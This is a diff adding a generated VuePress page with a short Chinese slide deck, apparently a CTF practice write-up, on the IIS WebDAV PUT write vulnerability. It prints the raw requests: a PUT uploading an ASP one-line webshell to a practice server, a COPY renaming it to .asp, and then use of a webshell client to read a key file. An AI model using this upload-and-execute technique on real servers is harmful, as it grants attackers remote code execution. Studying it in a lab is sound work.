@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="generator" content="VuePress 2.0.0-rc.8" />
+    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.31" />
+    <style>
+      html {
+        background: var(--bg-color, #fff);
+      }
+
+      html[data-theme="dark"] {
+        background: var(--bg-color, #1d1e1f);
+      }
+
+      body {
+        background: var(--bg-color);
+      }
+    </style>
+    <script>
+      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
+      const systemDarkMode =
+        window.matchMedia &&
+        window.matchMedia("(prefers-color-scheme: dark)").matches;
+
+      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
+        document.documentElement.setAttribute("data-theme", "dark");
+      }
+    </script>
+    <meta property="og:url" content="https://salt.salta.top/web.html"><meta property="og:site_name" content="SALT"><meta property="og:title" content="web"><meta property="og:description" content="@slidestart 4.5 PUT 漏洞 大概就是说平时常用的都是 GET 和 POST 方法 然后还有个 PUT 方法 -- IIS 写权限漏洞 需要 IIS 服务器同时开启写入、脚本资源访问和WebDAV扩展这三个配置选项 然后就可以远程写入 WebShell 啦~ 实践 攻防世界没找到题目，刚在别的网站找到了 -- 先用 PUT 整个 ASP..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-04-22T03:14:50.000Z"><meta property="article:author" content="SaltA"><meta property="article:modified_time" content="2024-04-22T03:14:50.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"web","image":[""],"dateModified":"2024-04-22T03:14:50.000Z","author":[{"@type":"Person","name":"SaltA","url":"https://www.salta.top"}]}</script><title>web | SALT</title><meta name="description" content="@slidestart 4.5 PUT 漏洞 大概就是说平时常用的都是 GET 和 POST 方法 然后还有个 PUT 方法 -- IIS 写权限漏洞 需要 IIS 服务器同时开启写入、脚本资源访问和WebDAV扩展这三个配置选项 然后就可以远程写入 WebShell 啦~ 实践 攻防世界没找到题目，刚在别的网站找到了 -- 先用 PUT 整个 ASP...">
+    <link rel="preload" href="/assets/style-Cqjhur0d.css" as="style"><link rel="stylesheet" href="/assets/style-Cqjhur0d.css">
+    <link rel="modulepreload" href="/assets/app-CWMqkmWJ.js"><link rel="modulepreload" href="/assets/web.html-DloDhk5f.js"><link rel="modulepreload" href="/assets/plugin-vue_export-helper-DlAUqK2U.js">
+    <link rel="prefetch" href="/assets/index.html-BUucn4cU.js" as="script"><link rel="prefetch" href="/assets/intro.html-DY2y9_Ik.js" as="script"><link rel="prefetch" href="/assets/slides.html-Bmq-7qJc.js" as="script"><link rel="prefetch" href="/assets/2402-2024CNYGoods.html-u-zBC61m.js" as="script"><link rel="prefetch" href="/assets/2403-BirthdayGoods.html-DfK2_Njd.js" as="script"><link rel="prefetch" href="/assets/index.html-BB_Mfv-7.js" as="script"><link rel="prefetch" href="/assets/index.html-DfdkqvkX.js" as="script"><link rel="prefetch" href="/assets/SaltA.html-Bk7Jmsyo.js" as="script"><link rel="prefetch" href="/assets/baiweixi.html-BKf0zRLj.js" as="script"><link rel="prefetch" href="/assets/jinxiangmantianliuxingmianhua.html-C_7_eA2Y.js" as="script"><link rel="prefetch" href="/assets/lingyi.html-Dcz_y1LR.js" as="script"><link rel="prefetch" href="/assets/susu.html-DUntB0sZ.js" as="script"><link rel="prefetch" href="/assets/2307-LunaKindredCursor.html-BlV5y6mK.js" as="script"><link rel="prefetch" href="/assets/2403-chipichapa.html-DDra_DBR.js" as="script"><link rel="prefetch" href="/assets/2403-dailyemojis.html-KSqs8Tz7.js" as="script"><link rel="prefetch" href="/assets/2403-shuzhongjuanmo.html-Biu4Vw3b.js" as="script"><link rel="prefetch" href="/assets/index.html-DsnFN_N7.js" as="script"><link rel="prefetch" href="/assets/404.html-DpaZPM6f.js" as="script"><link rel="prefetch" href="/assets/index.html-DViydMtT.js" as="script"><link rel="prefetch" href="/assets/index.html-C5zusV8Y.js" as="script"><link rel="prefetch" href="/assets/index.html-eGPPtKRq.js" as="script"><link rel="prefetch" href="/assets/index.html-DgJt2Msb.js" as="script"><link rel="prefetch" href="/assets/index.html-FEvHzL3B.js" as="script"><link rel="prefetch" href="/assets/index.html-Cf0BE1JU.js" as="script"><link rel="prefetch" href="/assets/index.html-CFqGt5ep.js" as="script"><link rel="prefetch" href="/assets/index.html-B8b1hVfC.js" as="script"><link rel="prefetch" href="/assets/index.html-BKjnCW_2.js" as="script"><link rel="prefetch" href="/assets/index.html-DU6DYlLj.js" as="script"><link rel="prefetch" href="/assets/index.html-D3dNCNsY.js" as="script"><link rel="prefetch" href="/assets/index.html-xGENxHiq.js" as="script"><link rel="prefetch" href="/assets/index.html-BNLDMkT9.js" as="script"><link rel="prefetch" href="/assets/index.html-CFxNQzej.js" as="script"><link rel="prefetch" href="/assets/index.html-COXihuvX.js" as="script"><link rel="prefetch" href="/assets/index.html-CaBLXgMC.js" as="script"><link rel="prefetch" href="/assets/photoswipe.esm-SzV8tJDW.js" as="script">
+  </head>
+  <body>
+    <div id="app"><!--[--><div class="vp-reveal-page"><div><!-- markdownlint-disable MD024 MD051 --><p>@slidestart</p><!-- .slide: data-transition="slide" --><h2 id="_4-5-put-漏洞" tabindex="-1"><a class="header-anchor" href="#_4-5-put-漏洞"><span>4.5 PUT 漏洞</span></a></h2><hr><p>大概就是说平时常用的都是 <code>GET</code> 和 <code>POST</code> 方法</p><p>然后还有个 <code>PUT</code> 方法</p><p>--</p><h3 id="iis-写权限漏洞" tabindex="-1"><a class="header-anchor" href="#iis-写权限漏洞"><span>IIS 写权限漏洞</span></a></h3><!-- .element: class="r-fit-text" --><p>需要 IIS 服务器同时开启<em>写入</em>、<em>脚本资源访问</em>和<em>WebDAV扩展</em>这三个配置选项</p><!-- .element: class="r-fit-text" --><p>然后就可以远程写入 <strong>WebShell</strong> 啦~</p><hr><h3 id="实践" tabindex="-1"><a class="header-anchor" href="#实践"><span>实践</span></a></h3><!-- .element: class="r-fit-text" --><p>攻防世界没找到题目，刚在别的网站找到了</p><p>--</p><p>先用 <strong>PUT</strong> 整个 <code>ASP 一句话木马</code>进去</p><!-- .element: class="r-fit-text" --><blockquote><p>PUT /shell.txt HTTP/1.1 Host: 219.153.49.228:46502 Content-Length: 31</p><p>&lt;%execute(request(&quot;wssb&quot;))%&gt;</p></blockquote><!-- .element: class="r-fit-text" --><p>--</p><p>再用 <strong>COPY</strong> 或 <strong>MOVE</strong> 重命名为 <strong>.asp</strong> 扩展名</p><!-- .element: class="r-fit-text" --><blockquote><p>COPY /shell.txt HTTP/1.1 Host: 219.153.49.228:46502 Destination: http://219.153.49.228:46502/shell.asp</p></blockquote><p>--</p><p>收到 <code>201 Created</code> 就说明成功了</p><p>开写 WebShell</p><!-- .element: class="r-fit-text" --><p>这里整个<code>菜刀</code>获取c盘里面的 <strong>key.php</strong></p><p>这道题就搞定了</p><p>@slideend</p></div><div class="vp-reveal-menu"><button type="button" class="menu-button"><span class="icon"></span></button><button type="button" class="back-button"><svg xmlns="http://www.w3.org/2000/svg" class="icon back-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="back icon"><path d="M1014.749 449.156v125.688H260.626l345.64 345.64-89.239 89.237L19.307 512l497.72-497.721 89.238 89.238-345.64 345.64h754.124z"></path></svg></button><button type="button" class="home-button"><svg xmlns="http://www.w3.org/2000/svg" class="icon home-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="home icon"><path d="M780.106 420.978L506.994 147.866 233.882 420.978h.045v455.11H780.06v-455.11h.046zm90.977 90.976V876.09a91.022 91.022 0 01-91.023 91.022H233.927a91.022 91.022 0 01-91.022-91.022V511.954l-67.22 67.175-64.307-64.307 431.309-431.31c35.498-35.498 93.115-35.498 128.614 0l431.309 431.31-64.307 64.307L871.083 512z"></path></svg></button></div></div><!--[--><!----><!--]--><!--]--></div>
+    <script type="module" src="/assets/app-CWMqkmWJ.js" defer></script>
+  </body>
+</html>
